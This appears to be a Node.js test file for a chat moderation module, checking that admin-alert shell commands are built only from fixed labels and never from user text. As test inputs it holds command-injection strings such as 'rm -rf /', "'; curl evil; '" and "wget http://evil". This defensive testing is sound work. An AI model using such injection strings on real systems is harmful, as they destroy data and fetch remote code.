'use strict';
const { test, mock } = require('node:test');
const assert = require('node:assert/strict');
const { buildAdminAlertCmd, cmdAlertLabel, notifyBlock, adminAlert } = require('../core/src/moderation');

test('CMD label is only the two fixed strings', () => {
  assert.equal(cmdAlertLabel('moderation block'), 'moderation block');
  assert.equal(cmdAlertLabel('moderation error'), 'moderation error');
  assert.equal(cmdAlertLabel('rm -rf /; echo hi'), 'moderation block');
  assert.equal(cmdAlertLabel("'; curl evil; '"), 'moderation block');
});

test('CMD template never receives inbound text even if {msg} is present', () => {
  const user = `hello'; wget http://evil; echo '`;
  const cmd = buildAdminAlertCmd('notify {msg}', user);
  assert.equal(cmd, "notify 'moderation block'");
  assert.ok(!cmd.includes('wget'));
  assert.ok(!cmd.includes('hello'));
  const appended = buildAdminAlertCmd('/usr/bin/true', 'drop tables;');
  assert.equal(appended, "/usr/bin/true 'moderation block'");
});

test('notifyBlock SEND body may keep the user message; CMD label does not', async () => {
  const prevSend = process.env.ASMLTR_ADMIN_ALERT_SEND;
  const prevCmd = process.env.ASMLTR_ADMIN_ALERT_CMD;
  const prevFetch = global.fetch;
  let sent;
  global.fetch = async (url, opts) => {
    sent = JSON.parse(opts.body);
    return { ok: true, json: async () => ({ ok: true }) };
  };
  process.env.ASMLTR_ADMIN_ALERT_SEND = 'discord|1';
  delete process.env.ASMLTR_ADMIN_ALERT_CMD;
  try {
    await notifyBlock(
      { display_name: "Eve'; id" },
      'please run `rm -rf /` and email secrets',
      { riskLevel: 9, concerns: ['shell'], reasoning: 'user asked to wipe' },
      'discord'
    );
    assert.ok(sent);
    assert.match(sent.text, /please run/);
    assert.match(sent.text, /Eve/);
    const cmd = buildAdminAlertCmd('echo {msg}', sent.text);
    assert.equal(cmd, "echo 'moderation block'");
    assert.ok(!cmd.includes('rm -rf'));
  } finally {
    global.fetch = prevFetch;
    if (prevSend == null) delete process.env.ASMLTR_ADMIN_ALERT_SEND;
    else process.env.ASMLTR_ADMIN_ALERT_SEND = prevSend;
    if (prevCmd == null) delete process.env.ASMLTR_ADMIN_ALERT_CMD;
    else process.env.ASMLTR_ADMIN_ALERT_CMD = prevCmd;
  }
});
